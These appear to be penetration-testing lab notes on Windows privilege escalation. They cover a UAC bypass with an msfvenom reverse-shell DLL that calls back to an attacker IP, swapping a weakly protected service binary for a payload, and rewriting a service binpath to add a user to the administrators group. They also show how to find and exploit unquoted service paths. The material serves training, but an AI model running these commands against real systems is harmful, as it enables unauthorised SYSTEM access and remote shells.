# Attacking the OS

## **User Account Control**

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) is a feature that enables a consent prompt for elevated activities.

Bypassing UAC

[https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

* `whoami /priv` → reviewing user privileges
* `C:\\htb> net localgroup administrators` → confirm we are admin group member.

```
C:\\htb> REG QUERY HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v EnableLUA

HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System
    EnableLUA    REG_DWORD    0x1
```

**Confirming UAC is Enabled**

```powershell
PS C:\\htb> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

Current build version of windows is `14393`

<figure><img src="../.gitbook/assets/Untitled (5) (1).png" alt=""><figcaption></figcaption></figure>

looking at the github we can see technique number 54 matches.

This method targets  `SystemPropertiesAdvanced.exe`

Component is `srrstr.dll`

#### **Generating Malicious srrstr.dll DLL**

* `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll`

#### **Running the DLL**

* `C:\\htb> rundll32 shell32.dll,Control_RunDLL C:\\Users\\sarah\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll`

We should have a elevated shell that shows our privileges are available and can be enabled if needed.

## **Weak Permissions**

## **Permissive File System ACLs**

* `PS C:\\htb> .\\SharpUp.exe audit` → running  [SharpUp](https://github.com/GhostPack/SharpUp/) to check for service binaries suffering from weak ACLs.

```powershell
PS C:\\htb> .\\SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Service Binaries ===

  Name             : SecurityService
  DisplayName      : PC Security Management Service
  Description      : Responsible for managing PC security
  State            : Stopped
  StartMode        : Auto
  PathName         : "C:\\Program Files (x86)\\PCProtect\\SecurityService.exe"

  <SNIP>

```

From the result we can see  `PC Security Management Service`, which executes the `SecurityService.exe` binary when started.

```powershell
PS C:\\htb> icacls "C:\\Program Files (x86)\\PCProtect\\SecurityService.exe"

C:\\Program Files (x86)\\PCProtect\\SecurityService.exe BUILTIN\\Users:(I)(F)
                                                     Everyone:(I)(F)
                                                     NT AUTHORITY\\SYSTEM:(I)(F)
                                                     BUILTIN\\Administrators:(I)(F)
                                                     APPLICATION PACKAGE AUTHORITY\\ALL APPLICATION PACKAGES:(I)(RX)
                                                     APPLICATION PACKAGE AUTHORITY\\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
```

Using [icacls](https://ss64.com/nt/icacls.html) we can verify the vulnerability and see that the `EVERYONE` and `BUILTIN\\Users` groups have been granted full permissions to the directory, and therefore any unprivileged system user can manipulate the directory and its contents.

```
C:\\htb> cmd /c copy /Y SecurityService.exe "C:\\Program Files (x86)\\PCProtect\\SecurityService.exe"
C:\\htb> sc start SecurityService
```

now we can replace original binary with malicious binary generated with msfvenom and get reverse shell as SYSTEM.

## **Weak Service Permissions**

```
C:\\htb> SharpUp.exe audit

=== SharpUp: Running Privilege Escalation Checks ===

=== Modifiable Services ===

  Name             : WindscribeService
  DisplayName      : WindscribeService
  Description      : Manages the firewall and controls the VPN tunnel
  State            : Running
  StartMode        : Auto
  PathName         : "C:\\Program Files (x86)\\Windscribe\\WindscribeService.exe"
```

Looking at the sharpup result we can see WindscribeService has modifiable service.

#### **Checking Permissions with** [**AccessChk**](https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk)

```
C:\\htb> accesschk.exe /accepteula -quvcw WindscribeService

Accesschk v6.13 - Reports effective permissions for securable objects
Copyright ⌐ 2006-2020 Mark Russinovich
Sysinternals - www.sysinternals.com

WindscribeService
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\\Administrators
        SERVICE_ALL_ACCESS
  RW NT AUTHORITY\\Authenticated Users
        SERVICE_ALL_ACCESS
```

from the output we can see, Authenticate Users (i.e all the users accounts that have been authenticated) have Read and Write Permission

lets query the service

```bash
C:\\htb> sc qc WindscribeService
```

Then change the Service Binary Path

```
C:\\htb> sc config WindscribeService binpath="cmd /c net localgroup administrators htb-student /add"

[SC] ChangeServiceConfig SUCCESS
```

then stop and start the service as:

* `C:\\htb> sc stop WindscribeService`
* `C:\\htb> sc start WindscribeService`

looking at the groups, we can see we are added

* `C:\\htb> net localgroup administrators`

## **Unquoted Service Path**

`C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64.exe`

if quote is not present, the order of execution occurs as;

* `C:\\Program`
* `C:\\Program Files`
* `C:\\Program Files (x86)\\System`
* `C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64`

So, if we have access to any of the folder before the actual exe file is present, we can add malicious code there.

* C:\Program.exe → we rename our malicious exe to program.exe and put it in C: drive

We can search for Unquoted Service using `PowerUp.ps1` ‣

* `Import-Module .\\PowerUp.ps1`
* `Get-UnquotedService`

or we can search manually using this command

```
C:\\htb> wmic service get name,displayname,pathname,startmode |findstr /i "auto" | findstr /i /v "c:\\windows\\\\" | findstr /i /v """
GVFS.Service                                                                        GVFS.Service                              C:\\Program Files\\GVFS\\GVFS.Service.exe                                                 Auto
System Explorer Service                                                             SystemExplorerHelpService                 C:\\Program Files (x86)\\System Explorer\\service\\SystemExplorerService64.exe             Auto
WindscribeService                                                                   WindscribeService                         C:\\Program Files (x86)\\Windscribe\\WindscribeService.exe                                  Auto
```

## **Vulnerable Services**

search for the installed apps and look for app/services that stands out. Search if the service/app is vulnerable to some kind of exploit

## **Kernel Exploit**

[https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)
